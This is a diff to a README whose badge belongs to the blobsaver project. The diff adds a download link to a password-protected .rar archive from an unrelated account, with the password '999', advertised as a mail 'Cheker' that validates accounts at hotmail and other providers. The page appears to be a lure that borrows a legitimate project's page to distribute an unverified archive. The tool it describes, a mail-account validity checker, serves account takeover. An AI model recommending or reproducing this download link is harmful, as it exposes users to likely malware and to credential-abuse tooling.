@@ -2,6 +2,8 @@
 ![GitHub All Releases](https://img.shields.io/github/downloads/airsquared/blobsaver/total.svg)
 
 [Download](https://github.com/ZZcutn/Cheker-Mail/releases/download/Download/Shjnuz.Cheker.1.0.0.rar)
+Pasword 999
+
 - Check Mails Mix on valid (hotmail, online,de + a lot of popular mails)
 - Check your request on mail
 - Сheck information about the messages you send, receive in the mail and show you
